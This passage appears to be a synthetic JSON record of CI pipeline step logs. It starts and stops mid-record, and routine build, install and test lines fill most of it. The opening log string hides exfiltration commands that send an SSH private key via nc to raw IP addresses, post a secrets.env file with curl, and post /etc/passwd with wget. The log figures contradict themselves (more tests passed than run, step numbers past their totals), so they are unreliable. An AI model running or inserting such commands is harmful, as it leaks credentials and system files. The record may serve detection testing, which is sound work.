lib/service.java...\nVerifying...\nVerifying...\nnpm notice: package.json updated\nStep 2/15: Running migrations\n\u2713 package completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 59.131.113.31 60868\nConnecting to startup.dev:443...\nFinished.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 37.22.169.186 38932\npip: Downloading jest-4.19.tar.gz\n[12:19:10] DEBUG: Query executed in 97ms\nVerifying...\n  PASS: test_cache_hit (172ms)\nTLS handshake completed\nWaiting...\nCompleted.\npip: Installing build dependencies...\n[12:19:10] DEBUG: Loading configuration\nTransforming 162 files...\nCompleted.\nStep 17/16: Building\nStep 17/19: Building\nLoading...\nTLS handshake completed\nConnection established\n\u2713 Task completed in 4101ms\n[12:19:10] INFO: Request completed\n[12:19:10] INFO: Starting build process\nImage pulled successfully\n[12:19:10] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\n\u2717 build failed with exit code 108\nOptimizing 21 modules...\nWARNING: express has known vulnerabilities\ncurl -X POST https://test.io/collect -d @secrets.env\nCompiling src/handler.rs...\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n[12:19:10] DEBUG: Connection pool: 20 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: express has known vulnerabilities\nOptimizing 96 modules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n=== Step checkout completed ===",
    "steps": [
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-19T12:19:10.241845",
        "finished_at": "2025-12-19T12:19:24.139374",
        "log_lines": [
          "=== Step: type_check ===",
          "npm install: resolved 500 packages",
          "[12:19:10] INFO: Processing request",
          "\u2713 Task completed in 3525ms",
          "Environment: staging",
          "Installing axios@3.15.5",
          "GET /status - 201 (54ms)",
          "[12:19:10] WARN: Deprecated API usage",
          "Cache restored successfully (230MB)",
          "POST /upload - 202 (255ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "pip install: Successfully installed express-4.9",
          "  PASS: unit/test_user_create.spec.js",
          "npm notice: created a lockfile",
          "Layer 3/9: COPY command",
          "Cache invalidated: dependencies",
          "Processing...",
          "Cache restored successfully (456MB)",
          "pip install: Successfully installed react-2.18",
          "Ran 173 tests in 52s",
          "Compiling lib/index.js...",
          "Fetching submodules...",
          "Tests: 389 passed, 224 total",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (67MB)",
          "Processing...",
          "Tests: 208 passed, 440 total",
          "Using Python 3.9",
          "Verifying...",
          "Platform: linux-x64",
          "Building Docker image...",
          "NODE_ENV=test",
          "Environment: test",
          "Uploading artifact 'dist' (25 files)",
          "[12:19:10] DEBUG: Memory usage: 316MB",
          "Uploading artifact 'coverage' (40 files)",
          "Already up to date.",
          "Minifying vendor.js",
          "Loading...",
          "Bundling runtime.css",
          "Time: 51.110s",
          "Cache hit for key-1831",
          "Test Suites: 43 passed, 17 total",
          "Cache hit for key-6524",
          "Compiling src/utils.go...",
          "Layer 7/13: RUN command",
          "Pushing to registry...",
          "pip install: Successfully installed express-5.0",
          "Compiling components/index.js...",
          "Fetching submodules...",
          "Switched to branch 'bugfix/task-464'",
          "Ran 104 tests in 37s",
          "Step 13/22: Building",
          "Minifying vendor.js",
          "Pulling image: alpine:latest",
          "Installing webpack@3.7.9",
          "Bundling vendor.js",
          "pip: Collecting prettier",
          "Coverage: 72% statements, 83% branches",
          "Compiling components/main.py...",
          "Cache miss for key-5156",
          "Environment: staging",
          "Cache saved successfully",
          "Optimizing 19 modules...",
          "Cache restored successfully (58MB)",
          "Cache saved successfully",
          "Processing...",
          "Compiling lib/handler.rs...",
          "Transforming 335 files...",
          "\u2717 build failed with exit code 50",
          "Transforming 796 files...",
          "Cache miss for key-5424",
          "pip: Downloading react-2.8.tar.gz",
          "TLS handshake completed",
          "Step 7/19: Deploying",
          "Test Suites: 24 passed, 26 total",
          "Step 9/23: Linting",
          "[12:19:10] INFO: Starting build process",
          "Completed.",
          "Cache invalidated: build",
          "Processing...",
          "Artifact uploaded: dist.zip (64MB)",
          "NODE_ENV=production",
          "pip: Installing build dependencies...",
          "Connection established",
          "pip install: Successfully installed webpack-4.15",
          "Ready.",
          "WARNING: jest has known vulnerabilities",
          "Success!",
          "Generating source maps...",
          "WARNING: axios has known vulnerabilities",
          "Generating source maps...",
          "Bundling styles.js",
          "Success!",
          "Tests: 97 passed, 341 total",
          "[12:19:10] DEBUG: Memory usage: 1190MB",
          "Step 16/23: Building",
          "npm install: resolved 992 packages",
          "  PASS: test_auth_login (440ms)",
          "Artifact downloaded: 45MB",
          "npm notice: created a lockfile",
          "Step 18/24: Installing dependencies",
          "Minifying vendor.js",
          "Exception: RuntimeError",
          "Artifact downloaded: 42MB",
          "Pulling image: node:latest",
          "Compiling src/main.py...",
          "WARNING: jest has known vulnerabilities",
          "Generating source maps...",
          "[12:19:10] DEBUG: Loading configuration",
          "Optimizing 10 modules...",
          "[12:19:10] INFO: Starting build process",
          "Connecting to acme.corp:443...",
          "Finished.",
          "Installing axios@3.3.10",
          "Installing express@5.0.1",
          "Image pulled successfully",
          "[12:19:10] INFO: Cache refreshed",
          "Using Node.js 20.2.0",
          "\u2713 Step 'build' succeeded",
          "Minifying main.js",
          "  PASS: test_auth_login (246ms)",
          "[12:19:10] DEBUG: Loading configuration",
          "Using Node.js 17.2.2",
          "Test Suites: 21 passed, 36 total",
          "[12:19:10] INFO: Starting build process",
          "Creating production build...",
          "TLS handshake completed",
          "\u2713 Task completed in 1002ms",
          "\u2713 All checks passed",
          "Compiling lib/utils.go...",
          "pip install: Successfully installed express-3.1",
          "Ready.",
          "Waiting...",
          "Cache invalidated: node_modules",
          "Time: 51.540s",
          "Artifact downloaded: 20MB",
          "NODE_ENV=development",
          "Test Suites: 42 passed, 41 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Building Docker image...",
          "[12:19:10] INFO: Request completed",
          "Checking out main branch",
          "Verifying...",
          "Fetching submodules...",
          "Processing...",
          "Switched to branch 'bugfix/task-271'",
          "Using Node.js 19.16.7",
          "Step 13/22: Deploying",
          "Waiting...",
          "Compiling components/utils.go...",
          "Fetching submodules...",
          "POST /data - 202 (474ms)",
          "Pushing to registry...",
          "Layer 1/8: ENV command",
          "npm install: resolved 953 packages",
          "Already up to date.",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "Bundling styles.css",
          "Environment: development",
          "[12:19:10] ERROR: Connection failed",
          "[12:19:10] DEBUG: Memory usage: 192MB",
          "NODE_ENV=test",
          "Step 5/16: Building",
          "Waiting...",
          "Optimizing 69 modules...",
          "[12:19:10] WARN: Deprecated API usage",
          "[12:19:10] DEBUG: Initializing service",
          "Creating production build...",
          "\u2713 Step 'install' succeeded",
          "Platform: win32-x64",
          "  PASS: test_api_health (25ms)",
          "Pulling image: node:18",
          "Optimizing 82 modules...",
          "FAILED: test_api_health",
          "[12:19:10] DEBUG: Loading configuration",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-19T12:19:24.139374",
        "finished_at": "2025-12-19T12:19:51.934432",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Verifying...",
          "TLS handshake completed",
          "[12:19:10] INFO: Request completed",
          "WARNING: jest has known vulnerabilities",
          "Installing jest@3.14.0",
          "HEAD is now at 9558303",
          "Using Node.js 18.8.0",
          "Compiling components/index.js...",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "HEAD is now at 7445406",
          "FAILED: test_auth_login",
          "Checking out develop branch",
          "Connection established",
          "Compiling lib/service.java...",
          "[12:19:10] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Transforming 175 files...",
          "Generating source maps...",
          "Ran 130 tests in 28s",
          "Waiting...",
          "HEAD is now at 688ff09",
          "[12:19:10] DEBUG: Connection pool: 20 active",
          "Step 14/15: Running migrations",
          "Cache hit for key-4249",
          "[12:19:10] DEBUG: Memory usage: 1656MB",
          "[12:19:10] DEBUG: Connection pool: 17 active",
          "Transforming 550 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 18/16: Deploying",
          "npm notice: created a lockfile",
          "npm install: added 412 packages",
          "Generating source maps...",
          "Processing...",
          "[12:19:10] INFO: Cache refreshed",
          "Completed.",
          "Exception: RuntimeError",
          "\u2713 Step 'test' succeeded",
          "Ran 85 tests in 47s",
          "\u2713 All checks passed",
          "Exception: ValueError",
          "Ready.",
          "Compiling utils/main.py...",
          "[12:19:10] WARN: Deprecated API usage",
          "Compiling components/utils.go...",
          "Finished.",
          "TLS handshake completed",
          "Installing webpack@2.15.7",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "[12:19:10] INFO: Connecting to database",
          "Processing...",
          "Switched to branch 'bugfix/task-490'",
          "Layer 7/8: COPY command",
          "[12:19:10] WARN: Deprecated API usage",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling components/handler.rs...",
          "  PASS: test_db_connect (57ms)",
          "Layer 9/10: COPY command",
          "Step 7/25: Linting",
          "Time: 104.83s",
          "FAILED: test_db_connect",
          "[12:19:10] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling components/main.py...",
          "[12:19:10] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Building Docker image...",
          "Using Python 3.11",
          "Environment: production",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Already up to date.",
          "Cache hit for key-9697",
          "Generating source maps...",
          "Success!",
          "Platform: linux-x64",
          "GET /health - 204 (10ms)",
          "\u2713 All checks passed",
          "[12:19:10] WARN: Deprecated API usage",
          "[12:19:10] INFO: Starting build process",
          "OK",
          "Step 2/23: Building",
          "Fetching submodules...",
          "POST /data - 202 (40ms)",
          "npm install: resolved 706 packages",
          "Cache miss for key-5046",
          "Optimizing 57 modules...",
          "Compiling components/service.java...",
          "Compiling components/index.js...",
          "Processing...",
          "Checking out master branch",
          "Transforming 690 files...",
          "OK",
          "Connection established",
          "Step 11/21: Testing",
          "[12:19:10] DEBUG: Connection pool: 4 active",
          "Snapshots: 32 passed, 36 total",
          "Finished.",
          "[12:19:10] INFO: Starting build process",
          "[12:19:10] WARN: Deprecated API usage",
          "  PASS: unit/test_api_health.spec.js",
          "  PASS: test_auth_login (281ms)",
          "Creating production build...",
          "Step 6/22: Testing",
          "Transforming 433 files...",
          "Fetching submodules...",
          "TLS handshake completed",
          "Image pulled successfully",
          "Coverage: 77% statements, 83% branches",
          "Pulling image: node:latest",
          "Connection established",
          "pip: Installing build dependencies...",
          "pip: Collecting lodash",
          "npm notice: package.json updated",
          "Compiling components/utils.go...",
          "Installing lodash@3.15.4",
          "Compiling lib/main.py...",
          "yarn add: Done in 30.40s",
          "\u2713 Task completed in 2874ms",
          "Tests: 230 passed, 273 total",
          "\u2713 Step 'build' succeeded",
          "npm install: added 390 packages",
          "Test Suites: 8 passed, 27 total",
          "TLS handshake completed",
          "[12:19:10] DEBUG: Initializing service",
          "OK",
          "[12:19:10] INFO: Request completed",
          "\u2713 All checks passed",
          "Optimizing 70 modules...",
          "Finished.",
          "Step 18/19: Testing",
          "[12:19:10] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "Verifying...",
          "Ran 167 tests in 31s",
          "Pushing to registry...",
          "Cache hit for key-4402",
          "Snapshots: 49 passed, 44 total",
          "Using Python 3.10",
          "Completed.",
          "Coverage: 96% statements, 63% branches",
          "[12:19:10] DEBUG: Query executed in 11ms",
          "Platform: darwin-arm64",
          "Minifying app.js",
          "\u2713 Task completed in 2005ms",
          "Verifying...",
          "Installing prettier@5.8.0",
          "\u2717 build failed with exit code 9",
          "Success!",
          "Switched to branch 'feature/task-772'",
          "Installing webpack@2.13.5",
          "Step 14/23: Installing dependencies",
          "[12:19:10] WARN: Deprecated API usage",
          "[12:19:10] ERROR: Connection failed",
          "[12:19:10] DEBUG: Query executed in 47ms",
          "\u2717 build failed with exit code 40",
          "Minifying vendor.js",
          "[12:19:10] DEBUG: Loading configuration",
          "Compiling components/main.py...",
          "pip: Downloading react-2.9.tar.gz",
          "Creating production build...",
          "Artifact downloaded: 24MB",
          "Cache miss for key-3881",
          "\u2713 All checks passed",
          "FAILED: test_db_connect",
          "Environment: production",
          "Environment: development",
          "yarn add: Done in 27.55s",
          "WARNING: react has known vulnerabilities",
          "Done.",
          "npm notice: package.json updated",
          "Verifying...",
          "Image pulled successfully",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-19T12:19:51.934432",
        "finished_at": "2025-12-19T12:20:05.831961",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:19:10] DEBUG: Connection pool: 9 active",
          "Pulling image: alpine:latest",
          "Tests: 195 passed, 448 total",
          "Pulling image: python:latest",
          "Step 20/15: Deploying",
          "Done.",
          "[12:19:10] INFO: Connecting to database",
          "Using Node.js 14.3.3",
          "NODE_ENV=test",
          "Transforming 678 files...",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:10] DEBUG: Initializing service",
          "Step 15/16: Building",
          "\u2713 Task completed in 217ms",
          "Tests: 246 passed, 302 total",
          "\u2717 build failed with exit code 8",
          "Ready.",
          "Environment: test",
          "Step 8/15: Installing dependencies",
          "npm install: resolved 1442 packages",
          "Success!",
          "npm install: resolved 539 packages",
          "Loading...",
          "Completed.",
          "Cache hit for key-3056",
          "Success!",
          "Verifying...",
          "Ready.",
          "\u2713 Step 'install' succeeded",
          "Installing lodash@4.6.7",
          "GET /status - 201 (5ms)",
          "Using Python 3.10",
          "GET /status - 201 (91ms)",
          "Step 6/18: Deploying",
          "Step 20/19: Testing",
          "Tests: 123 passed, 125 total",
          "\u2713 Task completed in 2314ms",
          "WARNING: lodash has known vulnerabilities",
          "TLS handshake completed",
          "Processing...",
          "[12:19:10] DEBUG: Query executed in 40ms",
          "Snapshots: 50 passed, 42 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "TLS handshake completed",
          "[12:19:10] DEBUG: Query executed in 28ms",
          "npm install: resolved 819 packages",
          "Checking out master branch",
          "npm install: resolved 1399 packages",
          "Step 18/15: Running migrations",
          "Artifact uploaded: dist.zip (98MB)",
          "Test Suites: 14 passed, 11 total",
          "Coverage: 94% statements, 90% branches",
          "Connecting to startup.dev:443...",
          "npm notice: package.json updated",
          "Ready.",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:19:10] ERROR: Connection failed",
          "[12:19:10] INFO: Cache refreshed",
          "[12:19:10] DEBUG: Connection pool: 7 active",
          "Exception: NullPointerException",
          "Cache restored successfully (425MB)",
          "Completed.",
          "[12:19:10] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "Exception: ValueError",
          "  PASS: unit/test_auth_login.spec.js",
          "Platform: linux-x64",
          "pip: Collecting prettier",
          "Pushing to registry...",
          "Coverage: 91% statements, 92% branches",
          "Cache saved successfully",
          "Compiling src/app.ts...",
          "[12:19:10] WARN: Deprecated API usage",
          "Installing lodash@2.11.5",
          "Layer 9/14: ENV command",
          "Exception: TypeError",
          "[12:19:10] INFO: Cache refreshed",
          "Step 16/22: Running migrations",
          "[12:19:10] INFO: Starting build process",
          "npm install: added 82 packages",
          "[12:19:10] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Verifying...",
          "Compiling lib/app.ts...",
          "Using Node.js 20.18.5",
          "Compiling utils/service.java...",
          "\u2713 All checks passed",
          "Step 13/16: Testing",
          "Already up to date.",
          "Loading...",
          "Connecting to cloud.services:443...",
          "Pulling image: alpine:latest",
          "Image pulled successfully",
          "Connecting to test.io:443...",
          "Waiting...",
          "Installing prettier@2.9.7",
          "Time: 120.418s",
          "Platform: win32-x64",
          "Step 16/15: Deploying",
          "Cache hit for key-6917",
          "Switched to branch 'feature/task-714'",
          "Platform: linux-x64",
          "Compiling components/service.java...",
          "  PASS: test_cache_hit (304ms)",
          "\u2713 Step 'build' succeeded",
          "Connection established",
          "Switched to branch 'bugfix/task-462'",
          "[12:19:10] INFO: Processing request",
          "npm install: added 338 packages",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Creating production build...",
          "Cache invalidated: build",
          "pip: Downloading jest-2.8.tar.gz",
          "Uploading artifact 'dist' (42 files)",
          "Uploading artifact 'dist' (9 files)",
          "Platform: linux-x64",
          "Ran 31 tests in 11s",
          "[12:19:10] DEBUG: Loading configuration",
          "WARNING: eslint has known vulnerabilities",
          "Using Python 3.9",
          "Verifying...",
          "Time: 118.908s",
          "yarn add: Done in 10.40s",
          "Connection established",
          "Platform: linux-x64",
          "Artifact uploaded: dist.zip (80MB)",
          "Optimizing 84 modules...",
          "pip install: Successfully installed axios-5.12",
          "Completed.",
          "[12:19:10] WARN: Deprecated API usage",
          "Completed.",
          "Finished.",
          "Loading...",
          "[12:19:10] DEBUG: Memory usage: 262MB",
          "[12:19:10] DEBUG: Loading configuration",
          "Pushing to registry...",
          "NODE_ENV=production",
          "Installing react@5.17.0",
          "\u2713 Task completed in 327ms",
          "Connecting to example.com:443...",
          "Step 13/23: Running migrations",
          "Cache invalidated: build",
          "Already up to date.",
          "[12:19:10] INFO: Connecting to database",
          "Building Docker image...",
          "Pulling image: node:18",
          "Already up to date.",
          "Processing...",
          "Cache miss for key-6382",
          "Creating production build...",
          "Cache miss for key-3903",
          "Compiling components/index.js...",
          "Already up to date.",
          "HEAD is now at 72ac3c2",
          "[12:19:10] WARN: Deprecated API usage",
          "  PASS: e2e/test_auth_login.spec.js",
          "Generating source maps...",
          "Uploading artifact 'coverage' (20 files)",
          "Step 19/21: Deploying",
          "\u2713 Task completed in 1183ms",
          "Creating production build...",
          "\u2713 All checks passed",
          "Test Suites: 43 passed, 18 total",
          "TLS handshake completed",
          "Coverage: 74% statements, 76% branches",
          "Platform: darwin-arm64",
          "Generating source maps...",
          "Pushing to registry...",
          "Loading...",
          "Success!",
          "Step 5/24: Installing dependencies",
          "Switched to branch 'hotfix/task-330'",
          "\u2713 Task completed in 941ms",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 63 modules...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-19T12:20:05.831961",
        "finished_at": "2025-12-19T12:20:47.524548",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:19:10] DEBUG: Connection pool: 9 active",
          "\u2713 Step 'install' succeeded",
          "Artifact uploaded: dist.zip (59MB)",
          "pip: Collecting jest",
          "[12:19:10] INFO: Request completed",
          "[12:19:10] INFO: Processing request",
          "Building Docker image...",
          "Step 8/22: Linting",
          "Checking out develop branch",
          "npm install: added 322 packages",
          "[12:19:10] INFO: Request completed",
          "Step 6/23: Linting",
          "WARNING: prettier has known vulnerabilities",
          "POST /api - 202 (419ms)",
          "npm notice: package.json updated",
          "OK",
          "Generating source maps...",
          "Cache restored successfully (287MB)",
          "[12:19:10] INFO: Starting build process",
          "Snapshots: 47 passed, 1 total",
          "Installing express@1.11.2",
          "  PASS: test_cache_hit (243ms)",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 16/23: Deploying",
          "Finished.",
          "Cache hit for key-1160",
          "[12:19:10] WARN: Deprecated API usage",
          "NODE_ENV=test",
          "Optimizing 86 modules...",
          "[12:19:10] DEBUG: Loading configuration",
          "Step 15/25: Testing",
          "  PASS: integration/test_user_create.spec.js",
          "Pulling image: node:3.11",
          "Done.",
          "TLS handshake completed",
          "Uploading artifact 'dist' (50 files)",
          "Compiling components/app.ts...",
          "Using Python 3.9",
          "Fetching submodules...",
          "Tests: 405 passed, 395 total",
          "Compiling src/index.js...",
          "pip: Installing build dependencies...",
          "Verifying...",
          "Success!",
          "Bundling styles.js",
          "\u2717 build failed with exit code 57",
          "Snapshots: 15 passed, 3 total",
          "Coverage: 86% statements, 77% branches",
          "[12:19:10] ERROR: Connection failed",
          "\u2713 All checks passed",
          "Step 5/23: Deploying",
          "OK",
          "Using Python 3.11",
          "WARNING: axios has known vulnerabilities",
          "Layer 1/11: ENV command",
          "Done.",
          "Connection established",
          "npm install: resolved 1427 packages",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:10] DEBUG: Connection pool: 5 active",
          "GET /api - 201 (4ms)",
          "[12:19:10] INFO: Connecting to database",
          "Step 3/23: Linting",
          "Verifying...",
          "Pulling image: python:latest",
          "Ran 99 tests in 56s",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Completed.",
          "pip: Downloading prettier-4.1.tar.gz",
          "Verifying...",
          "pip install: Successfully installed jest-2.0",
          "NODE_ENV=development",
          "Connecting to test.io:443...",
          "[12:19:10] INFO: Processing request",
          "Step 7/21: Linting",
          "[12:19:10] WARN: Deprecated API usage",
          "Cache restored successfully (468MB)",
          "  PASS: e2e/test_api_health.spec.js",
          "Compiling lib/handler.rs...",
          "Step 10/19: Installing dependencies",
          "WARNING: lodash has known vulnerabilities",
          "Step 6/21: Building",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Already up to date.",
          "Processing...",
          "POST /upload - 201 (227ms)",
          "Time: 79.848s",
          "Time: 97.183s",
          "[12:19:10] WARN: Deprecated API usage",
          "[12:19:10] DEBUG: Connection pool: 12 active",
          "Installing express@5.3.3",
          "\u2717 build failed with exit code 72",
          "Artifact uploaded: build.tar.gz (20MB)",
          "npm install: resolved 1415 packages",
          "pip: Installing build dependencies...",
          "[12:19:10] DEBUG: Memory usage: 531MB",
          "Waiting...",
          "Step 2/16: Linting",
          "Artifact uploaded: dist.zip (45MB)",
          "Processing...",
          "Transforming 838 files...",
          "npm install: resolved 595 packages",
          "Verifying...",
          "Cache restored successfully (407MB)",
          "[12:19:10] INFO: Processing request",
          "Connecting to test.io:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "Switched to branch 'bugfix/task-988'",
          "[12:19:10] DEBUG: Initializing service",
          "  PASS: unit/test_api_health.spec.js",
          "[12:19:10] DEBUG: Query executed in 85ms",
          "POST /data - 201 (157ms)",
          "[12:19:10] WARN: Deprecated API usage",
          "Artifact downloaded: 38MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Platform: darwin-arm64",
          "[12:19:10] DEBUG: Connection pool: 16 active",
          "Platform: darwin-arm64",
          "Bundling styles.css",
          "TLS handshake completed",
          "Installing express@4.20.5",
          "Switched to branch 'hotfix/task-686'",
          "Compiling components/service.java...",
          "Cache saved successfully",
          "Cache hit for key-6052",
          "Cache saved successfully",
          "Loading...",
          "[12:19:10] INFO: Cache refreshed",
          "Loading...",
          "[12:19:10] DEBUG: Connection pool: 9 active",
          "Uploading artifact 'dist' (6 files)",
          "Optimizing 33 modules...",
          "Compiling lib/main.py...",
          "Uploading artifact 'build' (20 files)",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "pip install: Successfully installed eslint-4.13",
          "Compiling lib/service.java...",
          "Already up to date.",
          "Bundling runtime.js",
          "Compiling components/index.js...",
          "pip: Collecting lodash",
          "Processing...",
          "Checking out main branch",
          "npm notice: package.json updated",
          "Test Suites: 39 passed, 19 total",
          "\u2717 build failed with exit code 95",
          "Success!",
          "npm notice: created a lockfile",
          "Switched to branch 'hotfix/task-360'",
          "Generating source maps...",
          "Cache miss for key-8580",
          "Verifying...",
          "Compiling lib/app.ts...",
          "Exception: RuntimeError",
          "npm install: added 49 packages",
          "Cache restored successfully (146MB)",
          "Environment: test",
          "Verifying...",
          "Step 12/25: Deploying",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Artifact downloaded: 50MB",
          "Connection established",
          "Success!",
          "Cache saved successfully",
          "Time: 2.70s",
          "[12:19:10] DEBUG: Loading configuration",
          "Building Docker image...",
          "TLS handshake completed",
          "HEAD is now at b8e5995",
          "Tests: 171 passed, 198 total",
          "Cache invalidated: dependencies",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-19T12:20:47.524548",
        "finished_at": "2025-12-19T12:20:55.863065",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Coverage: 78% statements, 67% branches",
          "Time: 3.180s",
          "[12:19:10] INFO: Starting build process",
          "Compiling components/main.py...",
          "Switched to branch 'bugfix/task-799'",
          "Layer 1/11: COPY command",
          "npm install: added 200 packages",
          "Connecting to test.io:443...",
          "pip install: Successfully installed express-5.12",
          "Environment: test",
          "Cache invalidated: node_modules",
          "Cache hit for key-7985",
          "Environment: production",
          "Installing express@2.16.4",
          "Pulling image: python:18",
          "\u2713 Task completed in 1379ms",
          "Image pulled successfully",
          "[12:19:10] DEBUG: Connection pool: 7 active",
          "pip: Installing build dependencies...",
          "WARNING: express has known vulnerabilities",
          "pip install: Successfully installed axios-1.11",
          "Compiling src/handler.rs...",
          "Finished.",
          "Compiling components/main.py...",
          "  PASS: test_user_create (135ms)",
          "Image pulled successfully",
          "Minifying app.js",
          "  PASS: integration/test_user_create.spec.js",
          "Uploading artifact 'dist' (40 files)",
          "  PASS: e2e/test_db_connect.spec.js",
          "Done.",
          "[12:19:10] DEBUG: Loading configuration",
          "npm install: added 22 packages",
          "\u2713 All checks passed",
          "npm install: added 376 packages",
          "NODE_ENV=test",
          "Success!",
          "  PASS: test_api_health (264ms)",
          "Cache hit for key-8513",
          "[12:19:10] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Snapshots: 7 passed, 17 total",
          "pip: Collecting react",
          "Verifying...",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "Switched to branch 'hotfix/task-154'",
          "Compiling components/main.py...",
          "Creating production build...",
          "Artifact uploaded: dist.zip (56MB)",
          "Compiling lib/utils.go...",
          "Ran 194 tests in 48s",
          "Ready.",
          "[12:19:10] WARN: Deprecated API usage",
          "Time: 43.971s",
          "[12:19:10] DEBUG: Query executed in 52ms",
          "Compiling components/index.js...",
          "[12:19:10] WARN: Deprecated API usage",
          "Compiling components/index.js...",
          "[12:19:10] DEBUG: Connection pool: 20 active",
          "Success!",
          "Step 7/25: Installing dependencies",
          "\u2713 validate completed",
          "Using Python 3.12",
          "TLS handshake completed",
          "Artifact downloaded: 41MB",
          "[12:19:10] DEBUG: Initializing service",
          "Verifying...",
          "\u2713 Step 'setup' succeeded",
          "HEAD is now at c4b9609",
          "OK",
          "WARNING: lodash has known vulnerabilities",
          "Using Node.js 15.19.7",
          "Loading...",
          "[12:19:10] DEBUG: Initializing service",
          "Building Docker image...",
          "FAILED: test_cache_hit",
          "  PASS: test_auth_login (398ms)",
          "Loading...",
          "yarn add: Done in 17.46s",
          "Verifying...",
          "Step 17/24: Installing dependencies",
          "npm notice: created a lockfile",
          "Ready.",
          "[12:19:10] INFO: Connecting to database",
          "[12:19:10] INFO: Cache refreshed",
          "Tests: 171 passed, 147 total",
          "pip: Installing build dependencies...",
          "Test Suites: 32 passed, 41 total",
          "[12:19:10] ERROR: Connection failed",
          "Installing jest@2.3.1",
          "Compiling components/handler.rs...",
          "Step 3/19: Running migrations",
          "[12:19:10] WARN: Deprecated API usage",
          "Layer 2/8: ENV command",
          "Artifact uploaded: dist.zip (7MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Platform: darwin-arm64",
          "Ran 63 tests in 48s",
          "[12:19:10] DEBUG: Memory usage: 569MB",
          "Building Docker image...",
          "Connecting to acme.corp:443...",
          "yarn add: Done in 24.62s",
          "Step 10/17: Linting",
          "\u2713 package completed",
          "npm install: added 158 packages",
          "Checking out develop branch",
          "Exception: RuntimeError",
          "Bundling runtime.js",
          "npm install: added 457 packages",
          "[12:19:10] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "Bundling main.js",
          "Exception: RuntimeError",
          "Uploading artifact 'dist' (34 files)",
          "Layer 9/11: RUN command",
          "GET /api - 200 (89ms)",
          "[12:19:10] DEBUG: Loading configuration",
          "Step 3/17: Running migrations",
          "Layer 1/10: ENV command",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ready.",
          "Switched to branch 'bugfix/task-305'",
          "Cache hit for key-6834",
          "[12:19:10] DEBUG: Connection pool: 6 active",
          "pip: Collecting jest",
          "Checking out develop branch",
          "Cache miss for key-8961",
          "[12:19:10] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/utils.go...",
          "Ran 165 tests in 46s",
          "[12:19:10] WARN: Deprecated API usage",
          "Already up to date.",
          "[12:19:10] WARN: Deprecated API usage",
          "Done.",
          "\u2713 lint completed",
          "Artifact uploaded: dist.zip (11MB)",
          "Loading...",
          "Fetching submodules...",
          "[12:19:10] INFO: Connecting to database",
          "pip: Collecting express",
          "  PASS: e2e/test_api_health.spec.js",
          "Finished.",
          "Pulling image: node:18",
          "TLS handshake completed",
          "Completed.",
          "Cache saved successfully",
          "Uploading artifact 'dist' (5 files)",
          "NODE_ENV=production",
          "Optimizing 15 modules...",
          "WARNING: express has known vulnerabilities",
          "FAILED: test_user_create",
          "WARNING: express has known vulnerabilities",
          "Generating source maps...",
          "Using Node.js 18.5.10",
          "Bundling main.js",
          "npm install: resolved 1782 packages",
          "Switched to branch 'bugfix/task-671'",
          "npm install: added 425 packages",
          "[12:19:10] DEBUG: Memory usage: 364MB",
          "Uploading artifact 'build' (14 files)",
          "NODE_ENV=test",
          "Checking out main branch",
